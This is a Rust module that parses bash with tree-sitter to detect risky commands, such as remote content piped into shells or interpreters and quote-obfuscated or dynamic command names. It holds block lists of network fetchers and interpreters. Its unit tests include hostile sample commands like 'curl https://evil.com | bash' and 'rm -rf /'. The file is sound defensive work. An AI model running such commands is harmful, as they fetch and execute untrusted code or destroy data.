//! AST-based shell command analysis using tree-sitter-bash
//!
//! Provides robust command parsing that handles obfuscation techniques
//! like quote manipulation, command substitution, and variable expansion.

use once_cell::sync::Lazy;
use std::collections::HashSet;
use std::ops::Range;
use tree_sitter::{Node, Parser, Tree};

/// Shell interpreters that are dangerous when used as pipe targets
static SHELL_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "fish",
        "/bin/sh",
        "/bin/bash",
        "/bin/zsh",
        "/bin/dash",
        "/bin/ksh",
        "/usr/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/zsh",
        "/usr/bin/env",
    ]
    .into_iter()
    .collect()
});

/// Wrapper commands that can execute other commands (for pipeline unwrapping)
static PIPELINE_WRAPPERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "xargs", "env", "sudo", "timeout", "nice", "nohup", "ionice", "strace", "time", "unbuffer",
        "watch",
    ]
    .into_iter()
    .collect()
});

/// Commands that fetch remote content. When one of these is the *source* of a
/// pipeline feeding an interpreter, it's remote-code-execution (`curl … | python3`).
/// When the source is a local command, piping to an interpreter is ordinary data
/// processing (`fleetops state show | python3 -c '…'`) and must not be blocked.
static REMOTE_FETCHERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    // Unambiguous remote-content fetchers only. Dual-use cloud CLIs (aws, gh,
    // gcloud, az, rclone, s3cmd) are deliberately NOT here: they're overwhelmingly
    // used for `… | python3 -c` data pipelines (the exact pattern P1 exists to
    // allow), so treating them as fetchers would re-introduce the false positives.
    // Residual: remote code fetched via a dual-use CLI and piped to an interpreter
    // is not caught here — a documented tradeoff, revisitable at higher safety levels.
    [
        "curl", "wget", "wget2", "curlie", "xh", "nc", "ncat", "netcat", "fetch", "ssh", "scp",
        "sftp", "ftp", "tftp", "http", "https", "httpie", "aria2c", "axel", "socat", "openssl",
        "lynx", "w3m", "links",
    ]
    .into_iter()
    .collect()
});

/// Script interpreters (also dangerous as pipe targets)
static SCRIPT_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "python",
        "python2",
        "python3",
        "ruby",
        "perl",
        "node",
        "php",
        "/usr/bin/python",
        "/usr/bin/python3",
        "/usr/bin/ruby",
        "/usr/bin/perl",
        "/usr/bin/node",
    ]
    .into_iter()
    .collect()
});

/// Result of AST-based command analysis
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// All normalized command names found (handles quote obfuscation)
    pub commands: Vec<NormalizedCommand>,
    /// Whether any command position has dynamic execution (variable, substitution)
    pub has_dynamic_command: bool,
    /// Whether there's a pipeline to a shell interpreter
    pub has_pipe_to_shell: bool,
    /// Whether there's a pipeline to a script interpreter
    pub has_pipe_to_interpreter: bool,
    /// Whether ANY pipeline is sourced from remote content (informational).
    pub pipe_source_is_remote: bool,
    /// Whether a SINGLE pipeline has a remote fetcher in some stage AND a later
    /// stage that runs its stdin as code (`curl … | python3`, `nc … | bash | cat`)
    /// — i.e. remote code execution. Computed per-pipeline (with wrapper
    /// unwrapping) so a benign remote pipe in one compound segment and a local
    /// data→interpreter pipe in another don't combine into a false deny. An
    /// interpreter running an inline literal script (`python3 -c '…'`) reads the
    /// fetched bytes as data, not code, and does not set it (uun). This is the
    /// flag the RCE rule keys on.
    pub has_remote_source_to_interpreter: bool,
    /// Byte ranges of pipeline stages (after the first) verified to be an
    /// interpreter running an inline literal script. The text backstop rule
    /// `curl-pipe-python` is evaluated with these masked out.
    pub inline_script_ranges: Vec<Range<usize>>,
    /// Raw AST parse succeeded
    pub parsed: bool,
    /// Error message if parsing failed
    pub error: Option<String>,
}

/// A normalized command with its arguments
#[derive(Debug, Clone)]
pub struct NormalizedCommand {
    /// The normalized command name (quotes removed, concatenations resolved)
    pub name: String,
    /// The full command line for this command
    pub full_command: String,
    /// Whether the command name was dynamically generated
    pub is_dynamic: bool,
    /// Arguments to the command
    pub arguments: Vec<String>,
}

/// Parse and analyze a bash command using tree-sitter
pub fn analyze_command(source: &str) -> CommandAnalysis {
    let mut parser = Parser::new();

    // Set the bash language
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            has_remote_source_to_interpreter: false,
            inline_script_ranges: vec![],
            parsed: false,
            error: Some("Failed to load tree-sitter-bash language".to_string()),
        };
    }

    let tree = match parser.parse(source, None) {
        Some(t) => t,
        None => {
            return CommandAnalysis {
                commands: vec![],
                has_dynamic_command: false,
                has_pipe_to_shell: false,
                has_pipe_to_interpreter: false,
                pipe_source_is_remote: false,
                has_remote_source_to_interpreter: false,
                inline_script_ranges: vec![],
                parsed: false,
                error: Some("Failed to parse command".to_string()),
            };
        }
    };

    analyze_tree(&tree, source)
}

/// Analyze the parsed AST tree
fn analyze_tree(tree: &Tree, source: &str) -> CommandAnalysis {
    let root = tree.root_node();

    // CRITICAL FIX: Check if the tree has parse errors
    // tree-sitter can return a partial tree with errors, which might miss dangerous patterns
    // If there are errors, mark as not parsed to trigger fallback regex checks
    if root.has_error() {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            has_remote_source_to_interpreter: false,
            inline_script_ranges: vec![],
            parsed: false,
            error: Some("AST contains parse errors - using fallback".to_string()),
        };
    }

    let mut commands = Vec::new();
    let mut has_dynamic_command = false;
    let mut flags = PipeFlags::default();

    // Traverse all nodes looking for commands and pipelines
    collect_commands(&root, source, &mut commands, &mut has_dynamic_command);

    // Check for pipe to shell patterns
    check_pipelines(&root, source, &mut flags);

    CommandAnalysis {
        commands,
        has_dynamic_command,
        has_pipe_to_shell: flags.pipe_to_shell,
        has_pipe_to_interpreter: flags.pipe_to_interpreter,
        pipe_source_is_remote: flags.source_is_remote,
        has_remote_source_to_interpreter: flags.remote_source_to_interpreter,
        inline_script_ranges: flags.inline_script_ranges,
        parsed: true,
        error: None,
    }
}

/// Accumulated pipeline classification across all pipeline nodes in a command.
#[derive(Default)]
struct PipeFlags {
    /// Any pipeline sinks into a shell interpreter (broad, always dangerous).
    pipe_to_shell: bool,
    /// Any pipeline sinks into a script interpreter (informational).
    pipe_to_interpreter: bool,
    /// Any pipeline is sourced from a remote fetcher (informational).
    source_is_remote: bool,
    /// Some SINGLE pipeline is remote-sourced AND interpreter-sunk (RCE).
    remote_source_to_interpreter: bool,
    /// Stages verified as inline literal scripts (see CommandAnalysis).
    inline_script_ranges: Vec<Range<usize>>,
}

/// Recursively collect all commands from the AST
fn collect_commands(
    node: &Node,
    source: &str,
    commands: &mut Vec<NormalizedCommand>,
    has_dynamic: &mut bool,
) {
    match node.kind() {
        "command" => {
            if let Some(cmd) = extract_command(node, source) {
                if cmd.is_dynamic {
                    *has_dynamic = true;
                }
                commands.push(cmd);
            }
        }
        _ => {
            // Recurse into children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                collect_commands(&child, source, commands, has_dynamic);
            }
        }
    }
}

/// Extract a normalized command from a command node
fn extract_command(node: &Node, source: &str) -> Option<NormalizedCommand> {
    let full_text = node.utf8_text(source.as_bytes()).ok()?;

    // Find the command_name child
    let mut cursor = node.walk();
    let mut command_name_node = None;
    let mut arguments = Vec::new();
    let mut in_args = false;

    for child in node.children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                command_name_node = Some(child);
                in_args = true;
            }
            "word"
            | "string"
            | "raw_string"
            | "concatenation"
            | "simple_expansion"
            | "expansion"
            | "command_substitution"
                if in_args =>
            {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    arguments.push(normalize_word(&child, source));
                    let _ = text; // Silence warning
                }
            }
            _ => {}
        }
    }

    let command_name_node = command_name_node?;
    let (name, is_dynamic) = normalize_command_name(&command_name_node, source);

    Some(NormalizedCommand {
        name,
        full_command: full_text.to_string(),
        is_dynamic,
        arguments,
    })
}

/// Normalize a command name, handling quote obfuscation and detecting dynamic names
/// Returns (normalized_name, is_dynamic)
fn normalize_command_name(node: &Node, source: &str) -> (String, bool) {
    let mut cursor = node.walk();

    // Check the first child to determine what kind of command name this is
    if let Some(child) = node.children(&mut cursor).next() {
        match child.kind() {
            // Variable expansion in command position = dynamic
            "simple_expansion" | "expansion" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$?");
                return (text.to_string(), true);
            }
            // Command substitution in command position = dynamic
            "command_substitution" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$(...)");
                return (text.to_string(), true);
            }
            // Concatenation (like ba'sh') - normalize it
            "concatenation" => {
                let normalized = normalize_concatenation(&child, source);
                // Check if any part of the concatenation is dynamic
                let is_dynamic = has_dynamic_parts(&child, source);
                return (normalized, is_dynamic);
            }
            // Simple word
            "word" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (text.to_string(), false);
            }
            // Quoted string - remove quotes
            "string" | "raw_string" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (strip_quotes(text), false);
            }
            _ => {}
        }
    }

    // Fallback: use raw text
    let text = node.utf8_text(source.as_bytes()).unwrap_or("");
    (text.to_string(), false)
}

/// Normalize a concatenation node (like ba'sh' -> bash)
fn normalize_concatenation(node: &Node, source: &str) -> String {
    let mut result = String::new();
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            "string" | "raw_string" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(&strip_quotes(text));
                }
            }
            "simple_expansion" | "expansion" | "command_substitution" => {
                // Include as-is for pattern matching but mark as potentially dynamic
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            // Recurse for nested concatenations
            "concatenation" => {
                result.push_str(&normalize_concatenation(&child, source));
            }
            _ => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
        }
    }

    result
}

/// Check if a node contains dynamic parts (variables, command substitution)
#[allow(clippy::only_used_in_recursion)]
fn has_dynamic_parts(node: &Node, source: &str) -> bool {
    match node.kind() {
        "simple_expansion" | "expansion" | "command_substitution" => true,
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if has_dynamic_parts(&child, source) {
                    return true;
                }
            }
            false
        }
    }
}

/// Normalize a word (handles quoted strings, concatenations)
fn normalize_word(node: &Node, source: &str) -> String {
    match node.kind() {
        "concatenation" => normalize_concatenation(node, source),
        "string" | "raw_string" => {
            let text = node.utf8_text(source.as_bytes()).unwrap_or("");
            strip_quotes(text)
        }
        _ => node.utf8_text(source.as_bytes()).unwrap_or("").to_string(),
    }
}

/// Strip quotes from a string
fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Classify each pipeline node and accumulate flags. Source (remote-fetch) and
/// sink (interpreter) are evaluated PER pipeline so the RCE conjunction can't be
/// formed across unrelated compound segments; both sides unwrap wrappers.
fn check_pipelines(node: &Node, source: &str, flags: &mut PipeFlags) {
    if node.kind() == "pipeline" {
        let mut cursor = node.walk();
        let children: Vec<_> = node.children(&mut cursor).collect();

        // Sink = last command (with wrapper unwrapping: | xargs bash, | env python3).
        let mut sink_shell = false;
        let mut sink_interp = false;
        if let Some(last_cmd) = children.iter().rev().find(|c| c.kind() == "command") {
            if let Some(cmd) = extract_command(last_cmd, source) {
                check_command_for_interpreters(&cmd, &mut sink_shell, &mut sink_interp);
            }
        }

        // Source = first command (unwrap wrappers so `sudo wget … | ruby` is caught).
        let mut src_remote = false;
        if let Some(first_cmd) = children.iter().find(|c| c.kind() == "command") {
            if let Some(cmd) = extract_command(first_cmd, source) {
                src_remote = command_is_remote_fetcher(&cmd);
            }
        }

        flags.pipe_to_shell |= sink_shell;
        flags.pipe_to_interpreter |= sink_interp;
        flags.source_is_remote |= src_remote;

        // The RCE conjunction, scoped to THIS pipeline: a stage that runs its
        // stdin as code, downstream of any stage that fetches remote content.
        // Every stage counts, not just the last (`nc … | bash | cat`), and every
        // command inside a stage (`… | (python3)`, `… | cat "$(bash)"`).
        let stages: Vec<_> = {
            let mut c = node.walk();
            node.named_children(&mut c).collect()
        };
        // tree-sitter hangs a trailing redirect (`a | b < <(c)`) on a
        // redirected_statement around the whole pipeline; bash applies it to
        // the last stage, so its commands join that stage.
        let mut trailing = Vec::new();
        if let Some(parent) = node.parent() {
            if parent.kind() == "redirected_statement" {
                let mut c = parent.walk();
                for r in parent.named_children(&mut c) {
                    if r.kind().ends_with("_redirect") {
                        collect_command_nodes(&r, &mut trailing);
                    }
                }
            }
        }
        let mut upstream_remote = false;
        for (i, stage) in stages.iter().enumerate() {
            let mut cmds = Vec::new();
            collect_command_nodes(stage, &mut cmds);
            if i + 1 == stages.len() {
                cmds.extend(trailing.iter().copied());
            }
            if i > 0 {
                for c in &cmds {
                    let runs = runs_stdin_as_code(c, source, &mut flags.inline_script_ranges);
                    flags.remote_source_to_interpreter |= upstream_remote && runs;
                }
            }
            upstream_remote |= cmds.iter().any(|c| {
                extract_command(c, source).is_some_and(|nc| command_is_remote_fetcher(&nc))
            });
        }
    }

    // Recurse into children
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        check_pipelines(&child, source, flags);
    }
}

/// Whether a command is (or wraps, via sudo/env/timeout/…) a remote fetcher.
/// Checks the command name and, for wrapper commands, every argument — mirroring
/// the sink-side interpreter check so `sudo wget …`, `env FOO=1 curl …`,
/// `timeout 30 wget …` all resolve to their real fetcher.
fn command_is_remote_fetcher(cmd: &NormalizedCommand) -> bool {
    let base = |s: &str| {
        s.to_lowercase()
            .rsplit('/')
            .next()
            .unwrap_or("")
            .to_string()
    };
    let name = base(&cmd.name);
    if REMOTE_FETCHERS.contains(name.as_str()) {
        return true;
    }
    if PIPELINE_WRAPPERS.contains(name.as_str()) {
        // Resolve the wrapped command: the first argument that is not a flag, a
        // `KEY=VAL` env assignment, or a numeric duration operand (timeout/nice),
        // then test only THAT token. Scanning every argument would over-fire on a
        // fetcher word appearing as data (`nice grep http log | ruby`).
        if let Some(inner) = cmd
            .arguments
            .iter()
            .find(|a| !a.starts_with('-') && !a.contains('=') && !is_duration(a))
        {
            return REMOTE_FETCHERS.contains(base(inner).as_str());
        }
    }
    false
}

/// Whether a token is a bare numeric duration operand (`30`, `30s`, `5m`, `1h`),
/// as consumed by `timeout`/`nice` — so it's skipped when resolving the wrapped
/// command rather than mistaken for it.
fn is_duration(s: &str) -> bool {
    let digits = s.trim_end_matches(['s', 'm', 'h', 'd']);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

/// Every `command` node at or under `node`, including those in subshells,
/// groups and command substitutions (a `$(bash)` argument inherits the
/// pipeline's stdin too).
fn collect_command_nodes<'a>(node: &Node<'a>, out: &mut Vec<Node<'a>>) {
    if node.kind() == "command" {
        out.push(*node);
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_nodes(&child, out);
    }
}

/// Interpreter families, for the inline-literal-script exemption.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Interp {
    Shell,
    Python,
    Ruby,
    Perl,
    Node,
    Php,
}

/// Classify a command name as an interpreter, by full name or basename, with
/// version suffixes stripped (`python3.12`, `/opt/homebrew/bin/python3`).
fn interpreter_kind(name: &str) -> Option<Interp> {
    let lower = name.to_lowercase();
    let base = lower.rsplit('/').next().unwrap_or("");
    if SHELL_INTERPRETERS.contains(lower.as_str()) || SHELL_INTERPRETERS.contains(base) {
        return Some(Interp::Shell);
    }
    let stem = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    match stem {
        "python" | "pypy" => Some(Interp::Python),
        "ruby" => Some(Interp::Ruby),
        "perl" => Some(Interp::Perl),
        "node" | "nodejs" => Some(Interp::Node),
        "php" => Some(Interp::Php),
        _ => None,
    }
}

/// Whether a pipeline-stage command runs its stdin as code: a shell, a bare
/// interpreter (`python3`, `python3 -`, `python3 script.py`), or an
/// interpreter behind a wrapper (`xargs python3 -c`, `env python3 …`). An
/// interpreter invoked directly with an inline literal script reads stdin as
/// data; its range is recorded in `inline_ranges` and it does not count.
fn runs_stdin_as_code(node: &Node, source: &str, inline_ranges: &mut Vec<Range<usize>>) -> bool {
    let Some(cmd) = extract_command(node, source) else {
        return false;
    };
    match interpreter_kind(&cmd.name) {
        Some(Interp::Shell) => true,
        Some(kind) => {
            if is_inline_literal_script(node, source, kind) {
                inline_ranges.push(node.byte_range());
                false
            } else {
                true
            }
        }
        None => {
            let lower = cmd.name.to_lowercase();
            let base = lower.rsplit('/').next().unwrap_or("");
            PIPELINE_WRAPPERS.contains(base)
                && cmd
                    .arguments
                    .iter()
                    .any(|a| !a.starts_with('-') && interpreter_kind(a).is_some())
        }
    }
}

/// Node kinds whose text is not fixed at parse time.
const DYNAMIC_KINDS: &[&str] = &[
    "simple_expansion",
    "expansion",
    "command_substitution",
    "process_substitution",
    "arithmetic_expansion",
];

fn contains_kind(node: &Node, kinds: &[&str]) -> bool {
    if kinds.contains(&node.kind()) {
        return true;
    }
    let mut cursor = node.walk();
    let found = node.children(&mut cursor).any(|c| contains_kind(&c, kinds));
    found
}

/// Whether `node` is an interpreter command running an inline literal script:
/// `python3 -c '<code>'`, `ruby -e`, `perl -ne`, `node -e`, `php -r`. Strict:
/// - no env-assignment prefix (`PYTHONINSPECT=1` would read stdin as code);
/// - only known-harmless flags before the code flag (`python3 -i` would too);
/// - every argument and redirect literal (no `$x`, `$(…)`, `<(…)`);
/// - after the code, no further flags, except for Python (its `-c`
///   ends option parsing; later words are `sys.argv`);
/// - the code holds no obvious code-execution primitive (`exec`, `eval`,
///   `pickle`, …), so `exec(sys.stdin.read())` stays blocked.
fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
    let mut args = Vec::new();
    let mut seen_name = false;
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let k = child.kind();
        if k == "command_name" {
            seen_name = true;
        } else if k.ends_with("_redirect") {
            if contains_kind(&child, DYNAMIC_KINDS) {
                return false;
            }
        } else if !seen_name {
            return false; // variable_assignment prefix
        } else if child.is_named() {
            let literal = matches!(
                k,
                "word" | "raw_string" | "string" | "concatenation" | "ansi_c_string" | "number"
            ) && !contains_kind(&child, DYNAMIC_KINDS);
            if !literal {
                return false;
            }
            args.push(normalize_word(&child, source));
        }
    }

    let mut it = args.iter();
    loop {
        let Some(a) = it.next() else {
            return false; // no inline-code flag: a script file or stdin
        };
        if is_code_flag(kind, a) {
            break;
        }
        if !is_harmless_leading_flag(kind, a) {
            return false;
        }
    }
    let Some(code) = it.next() else {
        return false;
    };
    if inline_code_executes_code(kind, code) {
        return false;
    }
    kind == Interp::Python || it.all(|a| !a.starts_with('-'))
}

/// A short-flag cluster such as `-ne`: `-`, then letters from `allowed`, then
/// one of `last`.
fn is_flag_cluster(a: &str, allowed: &str, last: &[char]) -> bool {
    let Some(body) = a.strip_prefix('-') else {
        return false;
    };
    let mut chars: Vec<char> = body.chars().collect();
    match chars.pop() {
        Some(c) if last.contains(&c) => chars.iter().all(|c| allowed.contains(*c)),
        _ => false,
    }
}

fn is_code_flag(kind: Interp, a: &str) -> bool {
    match kind {
        Interp::Python => a == "-c",
        Interp::Ruby => is_flag_cluster(a, "nplaw", &['e']),
        Interp::Perl => is_flag_cluster(a, "lnpaw", &['e', 'E']),
        Interp::Node => matches!(a, "-e" | "--eval" | "-p" | "--print"),
        Interp::Php => a == "-r",
        Interp::Shell => false,
    }
}

fn is_harmless_leading_flag(kind: Interp, a: &str) -> bool {
    match kind {
        Interp::Python => matches!(
            a,
            "-u" | "-B" | "-E" | "-s" | "-S" | "-I" | "-O" | "-OO" | "-q" | "-b" | "-bb" | "-P"
        ),
        Interp::Ruby => is_flag_cluster(a, "nplaw", &['n', 'p', 'l', 'a', 'w']),
        Interp::Perl => is_flag_cluster(a, "lnpaw", &['l', 'n', 'p', 'a', 'w']),
        Interp::Node => matches!(
            a,
            "--no-warnings" | "--input-type=module" | "--input-type=commonjs"
        ),
        Interp::Php => a == "-n",
        Interp::Shell => false,
    }
}

/// Code-execution primitives that would turn fetched stdin back into code.
/// Not exhaustive: a determined literal can still exec its input. It keeps
/// the obvious forms (`exec(sys.stdin.read())`, `pickle.loads`, `eval <STDIN>`)
/// blocked under the RCE rule even when the content packs are disabled.
fn inline_code_executes_code(kind: Interp, code: &str) -> bool {
    static COMMON: Lazy<regex::Regex> = Lazy::new(|| {
        regex::Regex::new(
            r"exec|eval|system|popen|spawn|subprocess|child_process|pickle|marshal|shelve|dill|joblib|runpy|interact|yaml\.(unsafe_)?load|`",
        )
        .unwrap()
    });
    static RUBY_PERL: Lazy<regex::Regex> = Lazy::new(|| {
        regex::Regex::new(r"\bopen\b|\bload\b|\brequire\b|\bdo\b|\bqx\b|%x|\bsyscall\b").unwrap()
    });
    static NODE: Lazy<regex::Regex> =
        Lazy::new(|| regex::Regex::new(r"\bFunction\b|\bvm\b|\bimport\s*\(|\brequire\b").unwrap());
    static PHP: Lazy<regex::Regex> = Lazy::new(|| {
        regex::Regex::new(
            r"passthru|proc_open|\binclude|\brequire|\bassert\b|create_function|preg_replace",
        )
        .unwrap()
    });
    COMMON.is_match(code)
        || match kind {
            Interp::Ruby | Interp::Perl => RUBY_PERL.is_match(code),
            Interp::Node => NODE.is_match(code),
            Interp::Php => PHP.is_match(code),
            Interp::Python | Interp::Shell => false,
        }
}

/// `command` with each range replaced by a neutral token, for running text
/// rules on the parts the AST did not clear. Ranges come from tree-sitter, so
/// they sit on char boundaries; overlapping or duplicate ranges are skipped.
pub fn mask_ranges(command: &str, ranges: &[Range<usize>]) -> String {
    let mut sorted: Vec<_> = ranges.to_vec();
    sorted.sort_by_key(|r| (r.start, r.end));
    let mut out = String::with_capacity(command.len());
    let mut pos = 0;
    for r in sorted {
        if r.start < pos || r.end > command.len() {
            continue;
        }
        out.push_str(&command[pos..r.start]);
        out.push_str("inline-literal-script");
        pos = r.end;
    }
    out.push_str(&command[pos..]);
    out
}

/// Check a command (and its arguments) for shell/script interpreters
/// This handles wrappers like xargs, env, etc.
fn check_command_for_interpreters(
    cmd: &NormalizedCommand,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
) {
    let normalized_name = cmd.name.to_lowercase();

    // Direct interpreter check
    if SHELL_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_shell = true;
        return;
    }
    if SCRIPT_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_interpreter = true;
        return;
    }

    // Check if this is a wrapper command
    // If so, check the arguments for interpreters
    if PIPELINE_WRAPPERS.contains(normalized_name.as_str()) && !cmd.arguments.is_empty() {
        // For wrapper commands, check all arguments for interpreter names
        // This catches: xargs bash, xargs sh -c, env bash, sudo bash, etc.
        for arg in &cmd.arguments {
            let arg_lower = arg.to_lowercase();
            // Skip flags
            if arg_lower.starts_with('-') {
                continue;
            }
            // Check if this argument is an interpreter
            if SHELL_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_shell = true;
                return;
            }
            if SCRIPT_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_interpreter = true;
                return;
            }
            // Also check for path-based interpreter names
            if arg_lower.ends_with("/sh")
                || arg_lower.ends_with("/bash")
                || arg_lower.ends_with("/zsh")
                || arg_lower.ends_with("/dash")
            {
                *has_pipe_to_shell = true;
                return;
            }
            if arg_lower.ends_with("/python")
                || arg_lower.ends_with("/python3")
                || arg_lower.ends_with("/ruby")
                || arg_lower.ends_with("/perl")
                || arg_lower.ends_with("/node")
            {
                *has_pipe_to_interpreter = true;
                return;
            }
        }
    }
}

/// Get all command names from an analysis (for pattern matching)
pub fn get_command_names(analysis: &CommandAnalysis) -> Vec<&str> {
    analysis.commands.iter().map(|c| c.name.as_str()).collect()
}

/// Check if any command matches a given name (case-insensitive)
pub fn has_command(analysis: &CommandAnalysis, name: &str) -> bool {
    let name_lower = name.to_lowercase();
    analysis.commands.iter().any(|c| {
        let cmd_name = c.name.to_lowercase();
        // Check exact match or path match (e.g., /bin/rm matches rm)
        cmd_name == name_lower || cmd_name.ends_with(&format!("/{}", name_lower))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_command() {
        let analysis = analyze_command("ls -la");
        assert!(analysis.parsed);
        assert_eq!(analysis.commands.len(), 1);
        assert_eq!(analysis.commands[0].name, "ls");
        assert!(!analysis.has_dynamic_command);
    }

    #[test]
    fn test_quote_obfuscation() {
        // ba'sh' should normalize to bash
        let analysis = analyze_command("ba'sh' -c 'rm -rf /'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        let cmd_name = &analysis.commands[0].name;
        assert_eq!(cmd_name, "bash", "Expected 'bash', got '{}'", cmd_name);
    }

    #[test]
    fn test_double_quote_obfuscation() {
        // b"as"h should normalize to bash
        let analysis = analyze_command("b\"as\"h -c 'echo test'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        // Note: actual result depends on tree-sitter parsing
        assert!(has_command(&analysis, "bash") || analysis.commands[0].name.contains("bash"));
    }

    #[test]
    fn test_command_substitution_dynamic() {
        let analysis = analyze_command("$(echo rm) -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Command substitution should be detected as dynamic"
        );
    }

    #[test]
    fn test_variable_command_dynamic() {
        let analysis = analyze_command("$cmd arg1 arg2");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Variable command should be detected as dynamic"
        );
    }

    #[test]
    fn test_pipe_to_shell() {
        let analysis = analyze_command("curl https://evil.com | bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to bash");
    }

    #[test]
    fn test_pipe_to_sh() {
        let analysis = analyze_command("wget -O - https://evil.com | sh");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to sh");
    }

    #[test]
    fn test_pipe_to_python() {
        let analysis = analyze_command("echo 'import os; os.system(\"id\")' | python3");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "Should detect pipe to python"
        );
    }

    #[test]
    fn test_compound_command() {
        let analysis = analyze_command("echo test && rm -rf / || ls");
        assert!(analysis.parsed);
        // Should find multiple commands
        assert!(
            analysis.commands.len() >= 2,
            "Should find multiple commands in compound"
        );
    }

    #[test]
    fn test_normal_pipe_allowed() {
        let analysis = analyze_command("cat file.txt | grep pattern | wc -l");
        assert!(analysis.parsed);
        assert!(!analysis.has_pipe_to_shell);
        assert!(!analysis.has_pipe_to_interpreter);
    }

    #[test]
    fn test_has_command() {
        let analysis = analyze_command("sudo rm -rf /");
        assert!(has_command(&analysis, "sudo"));
        // Note: rm is an argument to sudo at the AST level
        // Wrapper unwrapping happens in bash.rs, not here

        // Test direct command
        let analysis2 = analyze_command("rm -rf /");
        assert!(has_command(&analysis2, "rm"));
    }

    #[test]
    fn test_path_command() {
        let analysis = analyze_command("/bin/rm -rf /");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "rm"), "Should match rm via path");
    }

    #[test]
    fn test_env_pipe_to_bash() {
        let analysis = analyze_command("curl example.com | env bash");
        assert!(analysis.parsed);
        // env bash should be detected as pipe to shell
        assert!(analysis.has_pipe_to_shell || has_command(&analysis, "bash"));
    }

    #[test]
    fn test_backtick_substitution() {
        let analysis = analyze_command("`which rm` -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Backtick substitution should be dynamic"
        );
    }

    #[test]
    fn test_safe_variable_in_argument() {
        // Variable in argument position is fine
        let analysis = analyze_command("echo $HOME");
        assert!(analysis.parsed);
        assert!(
            !analysis.has_dynamic_command,
            "Variable in argument is not dangerous"
        );
        assert!(has_command(&analysis, "echo"));
    }

    #[test]
    fn test_heredoc() {
        let analysis = analyze_command("cat << EOF\nhello\nEOF");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "cat"));
    }

    // === NEW TESTS FOR CRITICAL FIXES ===

    #[test]
    fn test_xargs_bash_pipe_detected() {
        // Critical fix: xargs bash should be detected as pipe to shell
        let analysis = analyze_command("echo 'echo pwned' | xargs bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_bash_c_pipe_detected() {
        let analysis = analyze_command("echo 'rm -rf /' | xargs bash -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash -c should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_sudo_bash_pipe_detected() {
        let analysis = analyze_command("cat script.sh | sudo bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "sudo bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_python_pipe_detected() {
        let analysis = analyze_command("echo 'import os' | xargs python3 -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "xargs python should be detected as pipe to interpreter"
        );
    }
}
